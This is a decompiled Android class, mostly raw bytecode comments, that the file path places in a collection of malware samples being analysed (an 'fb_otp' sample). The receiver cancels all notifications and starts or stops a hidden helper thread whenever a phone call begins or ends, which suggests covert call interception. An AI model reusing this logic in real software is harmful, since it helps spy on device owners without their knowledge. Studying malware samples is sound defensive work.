package com.soft360.Receiver;

import android.content.BroadcastReceiver;
import eq;

public class MyPhoneReceiver
  extends BroadcastReceiver
{
  eq a;
  
  /* Error */
  public void onReceive(android.content.Context paramContext, android.content.Intent paramIntent)
  {
    // Byte code:
    //   0: aconst_null
    //   1: astore 4
    //   3: aload_1
    //   4: ldc 19
    //   6: invokevirtual 25	android/content/Context:getSystemService	(Ljava/lang/String;)Ljava/lang/Object;
    //   9: checkcast 27	android/app/NotificationManager
    //   12: invokevirtual 30	android/app/NotificationManager:cancelAll	()V
    //   15: aload 4
    //   17: astore_1
    //   18: aload_2
    //   19: ldc 32
    //   21: invokevirtual 38	android/content/Intent:hasExtra	(Ljava/lang/String;)Z
    //   24: ifeq +10 -> 34
    //   27: aload_2
    //   28: ldc 32
    //   30: invokevirtual 42	android/content/Intent:getStringExtra	(Ljava/lang/String;)Ljava/lang/String;
    //   33: astore_1
    //   34: aload_1
    //   35: ifnull +154 -> 189
    //   38: aconst_null
    //   39: invokestatic 47	dU:a	(Landroid/content/Context;)LdU;
    //   42: pop
    //   43: aload_1
    //   44: getstatic 53	android/telephony/TelephonyManager:EXTRA_STATE_OFFHOOK	Ljava/lang/String;
    //   47: invokevirtual 59	java/lang/String:equals	(Ljava/lang/Object;)Z
    //   50: ifeq +78 -> 128
    //   53: invokestatic 63	dU:k	()Z
    //   56: ifeq +72 -> 128
    //   59: aload_0
    //   60: getfield 65	com/soft360/Receiver/MyPhoneReceiver:a	Leq;
    //   63: astore_2
    //   64: aload_2
    //   65: ifnull +24 -> 89
    //   68: aload_0
    //   69: getfield 65	com/soft360/Receiver/MyPhoneReceiver:a	Leq;
    //   72: invokevirtual 70	eq:b	()V
    //   75: aload_0
    //   76: aconst_null
    //   77: putfield 65	com/soft360/Receiver/MyPhoneReceiver:a	Leq;
    //   80: return
    //   81: astore_1
    //   82: aload_1
    //   83: invokevirtual 73	java/io/IOException:printStackTrace	()V
    //   86: goto -11 -> 75
    //   89: aload_0
    //   90: new 67	eq
    //   93: dup
    //   94: invokespecial 74	eq:<init>	()V
    //   97: putfield 65	com/soft360/Receiver/MyPhoneReceiver:a	Leq;
    //   100: aload_0
    //   101: getfield 65	com/soft360/Receiver/MyPhoneReceiver:a	Leq;
    //   104: invokevirtual 76	eq:a	()V
    //   107: new 78	java/lang/Thread
    //   110: dup
    //   111: new 80	es
    //   114: dup
    //   115: aload_0
    //   116: getfield 65	com/soft360/Receiver/MyPhoneReceiver:a	Leq;
    //   119: invokespecial 83	es:<init>	(Leq;)V
    //   122: invokespecial 86	java/lang/Thread:<init>	(Ljava/lang/Runnable;)V
    //   125: invokevirtual 89	java/lang/Thread:start	()V
    //   128: aload_1
    //   129: getstatic 92	android/telephony/TelephonyManager:EXTRA_STATE_IDLE	Ljava/lang/String;
    //   132: invokevirtual 59	java/lang/String:equals	(Ljava/lang/Object;)Z
    //   135: ifeq +54 -> 189
    //   138: invokestatic 63	dU:k	()Z
    //   141: istore_3
    //   142: iload_3
    //   143: ifeq +46 -> 189
    //   146: aload_0
    //   147: getfield 65	com/soft360/Receiver/MyPhoneReceiver:a	Leq;
    //   150: ifnull +39 -> 189
    //   153: aload_0
    //   154: getfield 65	com/soft360/Receiver/MyPhoneReceiver:a	Leq;
    //   157: invokevirtual 70	eq:b	()V
    //   160: aload_0
    //   161: aconst_null
    //   162: putfield 65	com/soft360/Receiver/MyPhoneReceiver:a	Leq;
    //   165: return
    //   166: astore_1
    //   167: aload_1
    //   168: invokevirtual 73	java/io/IOException:printStackTrace	()V
    //   171: return
    //   172: astore_2
    //   173: aload_0
    //   174: aconst_null
    //   175: putfield 65	com/soft360/Receiver/MyPhoneReceiver:a	Leq;
    //   178: aload_2
    //   179: invokevirtual 73	java/io/IOException:printStackTrace	()V
    //   182: goto -54 -> 128
    //   185: astore_1
    //   186: goto -171 -> 15
    //   189: return
    //   190: astore_1
    //   191: return
    // Local variable table:
    //   start	length	slot	name	signature
    //   0	192	0	this	MyPhoneReceiver
    //   0	192	1	paramContext	android.content.Context
    //   0	192	2	paramIntent	android.content.Intent
    //   141	2	3	bool	boolean
    //   1	15	4	localObject	Object
    // Exception table:
    //   from	to	target	type
    //   68	75	81	java/io/IOException
    //   146	165	166	java/io/IOException
    //   100	128	172	java/io/IOException
    //   3	15	185	java/lang/Exception
    //   18	34	190	java/lang/Exception
    //   38	64	190	java/lang/Exception
    //   68	75	190	java/lang/Exception
    //   75	80	190	java/lang/Exception
    //   82	86	190	java/lang/Exception
    //   89	100	190	java/lang/Exception
    //   100	128	190	java/lang/Exception
    //   128	142	190	java/lang/Exception
    //   146	165	190	java/lang/Exception
    //   167	171	190	java/lang/Exception
    //   173	182	190	java/lang/Exception
  }
}


/* Location:              /home/enzo/Documents/hacking/malwares/fb_otp/classes-dex2jar.jar!/com/soft360/Receiver/MyPhoneReceiver.class
 * Java compiler version: 6 (50.0)
 * JD-Core Version:       0.7.1
 */